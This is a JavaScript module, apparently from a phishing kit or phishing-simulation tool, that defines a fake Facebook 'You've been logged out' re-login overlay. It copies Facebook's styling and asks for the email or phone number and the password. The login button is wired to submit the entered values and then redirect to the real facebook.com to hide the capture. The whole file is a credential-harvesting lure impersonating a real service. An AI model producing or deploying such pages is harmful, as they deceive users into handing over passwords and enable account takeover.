// Facebook "logged out" re-auth overlay. Modern Facebook login styling.
module.exports = {
  id: 'facebook',
  label: 'Facebook',
  blurb: 'Facebook re-login dialog',

  css: `
  .fb-card{width:396px;max-width:100%;background:#fff;border-radius:8px;
    box-shadow:0 2px 14px rgba(0,0,0,.18);padding:22px 16px 18px;text-align:center}
  .fb-logo{color:#1877f2;font-size:42px;font-weight:700;letter-spacing:-2px;
    font-family:Helvetica,Arial,sans-serif;margin:4px 0 6px}
  .fb-sub{font-size:15px;color:#1c1e21;margin:0 0 16px}
  .fb-card input{width:100%;height:52px;padding:14px 16px;margin-bottom:12px;font-size:17px;
    border:1px solid #dddfe2;border-radius:8px;outline:none;color:#1c1e21;background:#fff}
  .fb-card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f0ff}
  .fb-login{width:100%;height:50px;border:none;border-radius:8px;background:#1877f2;
    color:#fff;font-size:19px;font-weight:700;cursor:pointer}
  .fb-login:hover{background:#166fe5}
  .fb-forgot{display:block;font-size:14px;color:#1877f2;text-decoration:none;margin:16px 0}
  .fb-forgot:hover{text-decoration:underline}
  .fb-hr{border:none;border-top:1px solid #dadde1;margin:16px 0}
  .fb-create{display:inline-block;height:48px;line-height:48px;padding:0 16px;border:none;
    border-radius:8px;background:#42b72a;color:#fff;font-size:17px;font-weight:700;cursor:pointer}
  .fb-create:hover{background:#36a420}
  `,

  html: `
  <div class="fb-card" data-wr-card>
    <div class="fb-logo">facebook</div>
    <div class="fb-sub">You've been logged out. Please log in again.</div>

    <input name="email" type="text" placeholder="Email address or phone number" autocomplete="username" />
    <input name="password" type="password" placeholder="Password" autocomplete="current-password" />

    <button class="fb-login" data-wr-submit data-wr-redirect="https://www.facebook.com/">Log in</button>

    <a class="fb-forgot" href="#" onclick="return false">Forgotten password?</a>
    <hr class="fb-hr" />
    <button type="button" class="fb-create">Create new account</button>
  </div>
  `,

  script: `
    setTimeout(function(){ var e=root.querySelector('input[name=email]'); if(e) e.focus(); },50);
  `
};
